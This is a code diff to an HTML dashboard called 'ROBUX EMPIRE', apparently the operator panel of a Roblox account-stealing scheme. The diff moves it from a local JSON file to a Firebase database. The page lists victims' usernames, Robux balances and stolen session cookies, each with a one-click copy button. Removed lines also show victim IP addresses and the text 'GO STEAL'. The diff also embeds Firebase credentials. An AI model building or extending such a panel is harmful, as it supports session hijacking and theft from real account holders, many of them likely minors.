@@ -4,6 +4,8 @@
   <meta charset="utf-8">
   <title>ROBUX EMPIRE</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&display=swap');
     body{margin:0;background:linear-gradient(135deg,#ff00aa,#00ffff,#ffff00);font-family:'Poppins',sans-serif;color:#000;overflow-x:hidden;}
@@ -55,6 +57,19 @@
 
   <script>
     const KEY = "01axrch";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyBUMdPMNAJpUzmyRfWjJ1RC7DsyoxcR0bk",
+      authDomain: "flamesaxrch-empire.firebaseapp.com",
+      projectId: "flamesaxrch-empire",
+      storageBucket: "flamesaxrch-empire.firebasestorage.app",
+      messagingSenderId: "1067890777932",
+      appId: "1:1067890777932:web:a50536cc21933b1e2139e9",
+      measurementId: "G-5J6LXK8C86"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
     let lastCount = 0;
 
     function toggleKey() {
@@ -71,31 +86,37 @@
         load();
         setInterval(load, 4000);
       } else {
-        alert("WRONG KEY DUMBASS");
+        alert("WRONG KEY");
       }
     }
 
-    async function load() {
-      try {
-        const res = await fetch('data.json?t=' + Date.now());
-        const d = await res.json();
-        let t = 0;
-        const h = d.map(c => {
-          t += Number(c.robux);
-          return `<div class="log"><img src="${c.headshot}" class="avatar" onerror="this.src='https://i.imgur.com/removed.png'"><div class="info"><h3>${c.user} (@${c.display})</h3><p class="robux">${Number(c.robux).toLocaleString()} Robux • RAP: ${Number(c.rap).toLocaleString()}</p><p>IP: ${c.ip} • ${c.time}</p><button class="copy" onclick="navigator.clipboard.writeText('${c.cookie}')">COPY COOKIE</button></div></div>`;
+    function load() {
+      db.ref('drops').once('value').then(s => {
+        const data = s.val() || {};
+        const arr = Object.values(data);
+        let total = 0;
+        const html = arr.map(c => {
+          total += Number(c.robux);
+          return `<div class="log">
+            <img src="${c.headshot}" class="avatar" onerror="this.src='https://i.imgur.com/removed.png'">
+            <div class="info">
+              <h3>${c.user} (@${c.display})</h3>
+              <p class="robux">${Number(c.robux).toLocaleString()} Robux</p>
+              <button class="copy" onclick="navigator.clipboard.writeText('${c.cookie}')">COPY</button>
+            </div>
+          </div>`;
         });
-        document.getElementById('total').textContent = t.toLocaleString();
-        document.getElementById('total2').textContent = t.toLocaleString();
-        document.getElementById('logs').innerHTML = h.join('') || "<h1 style='text-align:center;color:#fff;'>No victims yet — GO STEAL</h1>";
-        if (d.length > lastCount) {
-          // CASH SOUND
+        document.getElementById('total').textContent = total.toLocaleString();
+        document.getElementById('total2').textContent = total.toLocaleString();
+        document.getElementById('logs').innerHTML = html.join('') || "<h1 style='color:#fff;'>WAITING FOR DROP</h1>";
+        if (arr.length > lastCount) {
           const audio = new Audio('https://cdn.discordapp.com/attachments/1298475629385744394/1298475688884625420/alert.mp3');
           audio.play().catch(() => {});
         }
-        lastCount = d.length;
-      } catch (e) {
-        document.getElementById('logs').innerHTML = "<h1 style='color:#f00;'>ERROR LOADING EMPIRE</h1>";
-      }
+        lastCount = arr.length;
+      }).catch(() => {
+        document.getElementById('logs').innerHTML = "<h1 style='color:#f00;'>DB ERROR</h1>";
+      });
     }
   </script>
 </body>
